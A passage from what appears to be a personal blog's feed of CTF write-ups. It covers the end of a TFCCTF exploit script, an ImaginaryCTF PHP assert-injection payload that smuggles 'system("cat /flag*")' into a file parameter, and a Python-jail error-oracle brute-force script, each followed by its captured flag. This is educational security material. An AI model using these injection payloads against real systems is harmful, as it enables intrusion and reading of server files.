+    <span class="k">with</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span> <span class="k">as</span> <span class="n">ses</span><span class="p">:</span>
+        <span class="n">ses</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">REMOTE</span> <span class="o">+</span> <span class="s">'login'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s">'Content-Type'</span><span class="p">:</span><span class="s">'application/x-www-form-urlencoded'</span><span class="p">},</span> <span class="n">data</span><span class="o">=</span><span class="n">login</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="p">{</span>
+            <span class="s">'http'</span><span class="p">:</span> <span class="s">'http://0.0.0.0:8080'</span><span class="p">,</span>
+            <span class="s">'https'</span><span class="p">:</span> <span class="s">'https://0.0.0.0:8080'</span>
+        <span class="p">})</span>
+        <span class="n">res</span> <span class="o">=</span> <span class="n">ses</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">REMOTE</span> <span class="o">+</span> <span class="s">'a.html'</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="p">{</span>
+            <span class="s">'http'</span><span class="p">:</span> <span class="s">'http://0.0.0.0:8080'</span><span class="p">,</span>
+            <span class="s">'https'</span><span class="p">:</span> <span class="s">'https://0.0.0.0:8080'</span>
+        <span class="p">})</span>
+        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"DEBUGPRINT[4]: go.py:37: res.text=</span><span class="si">{</span><span class="n">res</span><span class="p">.</span><span class="n">text</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+<span class="n">create_file</span><span class="p">()</span>
+<span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">crash</span><span class="p">()</span>
+<span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+<span class="n">get</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h2 id="flag">Flag</h2>
+<p><code class="language-plaintext highlighter-rouge">TFCCTF{Cr4Sh_g0_bRbRbRbRbR}</code></p>
+
+<p>shafouz 2024/08/03</p>]]></content><author><name>shafouz</name><email>jlmacedomatos@gmail.com</email></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">journal - ImaginaryCTF 2024</title><link href="https://shafouz.github.io/2024/07/21/journal.html" rel="alternate" type="text/html" title="journal - ImaginaryCTF 2024" /><published>2024-07-21T04:00:00+00:00</published><updated>2024-07-21T04:00:00+00:00</updated><id>https://shafouz.github.io/2024/07/21/journal</id><content type="html" xml:base="https://shafouz.github.io/2024/07/21/journal.html"><![CDATA[<p>https://ctftime.org/event/2396</p>
+
+<h1 id="journal-web">journal (web)</h1>
+
+<p>one file php challenge</p>
+
+<h2 id="solution">Solution</h2>
+
+<p>At first i thought there was some include path stuff.
+But after trying every byte there were some interesting messages about assert.
+And its apparently well known:
+https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s">"file1.txt' and die(system(</span><span class="se">\"</span><span class="s">cat /flag*</span><span class="se">\"</span><span class="s">)) or '"</span>
+<span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"http://journal.chal.imaginaryctf.org/"</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s">"file"</span><span class="p">:</span><span class="n">payload</span><span class="p">})</span>
+<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"DEBUGPRINT[1]: go.py:14: res.text=</span><span class="si">{</span><span class="n">res</span><span class="p">.</span><span class="n">text</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h2 id="flag">Flag</h2>
+<p><code class="language-plaintext highlighter-rouge">ictf{assertion_failed_e3106922feb13b10}</code></p>
+
+<p>shafouz 2024/07/21</p>]]></content><author><name>shafouz</name><email>jlmacedomatos@gmail.com</email></author><summary type="html"><![CDATA[https://ctftime.org/event/2396]]></summary></entry><entry><title type="html">ok nice - ImaginaryCTF 2024</title><link href="https://shafouz.github.io/2024/07/21/ok-nice.html" rel="alternate" type="text/html" title="ok nice - ImaginaryCTF 2024" /><published>2024-07-21T04:00:00+00:00</published><updated>2024-07-21T04:00:00+00:00</updated><id>https://shafouz.github.io/2024/07/21/ok-nice</id><content type="html" xml:base="https://shafouz.github.io/2024/07/21/ok-nice.html"><![CDATA[<p>https://ctftime.org/event/2396</p>
+
+<h1 id="ok-nice-misc">ok-nice (misc)</h1>
+
+<p>python jail</p>
+
+<h2 id="solution">Solution</h2>
+
+<p>Very limited range of options, nothing gets printed other than
+<code class="language-plaintext highlighter-rouge">ok-nice</code> or <code class="language-plaintext highlighter-rouge">error</code>.</p>
+
+<p>So the idea is to use the error as an oracle and brute force every char.</p>
+
+<p>The main thing we are looking for is how to generate integers, so we can both index
+flag and compare it to the result of ord.</p>
+
+<p>Both <code class="language-plaintext highlighter-rouge">flag[True]</code> or <code class="language-plaintext highlighter-rouge">flag[False]</code> work.</p>
+
+<p>True and False also work for generating integers:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="bp">True</span> <span class="o">+</span> <span class="bp">True</span><span class="p">)</span> <span class="o">=</span> <span class="mi">2</span>
+</code></pre></div></div>
+
+<p>So now we can both index and compare two chars, something like:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ord</span><span class="p">(</span><span class="n">flag</span><span class="p">[</span><span class="bp">True</span><span class="p">])</span> <span class="o">-</span> <span class="p">(</span><span class="bp">True</span><span class="o">+</span><span class="bp">True</span><span class="p">)</span> <span class="c1"># checks if flag[1] == '\x02'
+</span></code></pre></div></div>
+
+<p>Now we just need to throw an error whenever they match</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="bp">True</span> <span class="o">/</span> <span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">flag</span><span class="p">[</span><span class="bp">True</span><span class="p">])</span> <span class="o">-</span> <span class="p">(</span><span class="bp">True</span><span class="o">+</span><span class="bp">True</span><span class="p">))</span> <span class="c1"># division by zero when they match
+</span></code></pre></div></div>
+
+<p>Then just loop through every idx and every char.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"ok-nice.chal.imaginaryctf.org"</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">guess</span><span class="p">(</span><span class="n">char</span><span class="p">):</span>
+    <span class="n">n</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">char</span><span class="p">)</span>
+    <span class="n">ret</span> <span class="o">=</span> <span class="s">""</span>
+    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
+        <span class="n">ret</span> <span class="o">=</span> <span class="n">ret</span> <span class="o">+</span> <span class="s">"True+"</span>
+    <span class="n">ret</span> <span class="o">=</span> <span class="n">ret</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+    <span class="k">return</span> <span class="n">ret</span>
+
+<span class="k">def</span> <span class="nf">get_idx</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
+    <span class="n">ret</span> <span class="o">=</span> <span class="s">""</span>
+    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n</span><span class="o">+</span><span class="mi">1</span><span class="p">):</span>
+        <span class="n">ret</span> <span class="o">=</span> <span class="n">ret</span> <span class="o">+</span> <span class="s">"True+"</span>
+    <span class="n">ret</span> <span class="o">=</span> <span class="n">ret</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+    <span class="k">return</span> <span class="n">ret</span>
+
+<span class="k">def</span> <span class="nf">build_payload</span><span class="p">(</span><span class="n">guess</span><span class="p">,</span> <span class="n">idx</span><span class="p">):</span>
+    <span class="k">return</span> <span class="sa">f</span><span class="s">"ord(flag[True])/((</span><span class="si">{</span><span class="n">guess</span><span class="si">}</span><span class="s">)-ord(flag[</span><span class="si">{</span><span class="n">idx</span><span class="si">}</span><span class="s">]))"</span>
+
+<span class="kn">import</span> <span class="nn">string</span><span class="p">,</span> <span class="n">time</span>
+
+<span class="n">chars</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">printable</span>
+
+<span class="n">flag</span> <span class="o">=</span> <span class="s">""</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">100</span><span class="p">):</span>
+    <span class="n">idx</span> <span class="o">=</span> <span class="n">get_idx</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">chars</span><span class="p">:</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="n">build_payload</span><span class="p">(</span><span class="n">guess</span><span class="p">(</span><span class="n">char</span><span class="p">),</span> <span class="n">idx</span><span class="p">)</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Enter input: "</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+        <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.100</span><span class="p">)</span>
+        <span class="n">out</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+        <span class="k">if</span> <span class="s">"error"</span> <span class="ow">in</span> <span class="n">out</span><span class="p">.</span><span class="n">decode</span><span class="p">():</span>
+            <span class="n">flag</span> <span class="o">=</span> <span class="n">flag</span> <span class="o">+</span> <span class="n">char</span>
+            <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"DEBUGPRINT[18]: go.py:45: flag=</span><span class="si">{</span><span class="n">flag</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h2 id="flag">Flag</h2>
+<p><code class="language-plaintext highlighter-rouge">ictf{0k_n1c3_7f4d3e5a6b}</code></p>
+
+<p>shafouz 2024/07/21</p>]]></content><author><name>shafouz</name><email>jlmacedomatos@gmail.com</email></author><summary type="html"><![CDATA[https://ctftime.org/event/2396]]></summary></entry></feed>
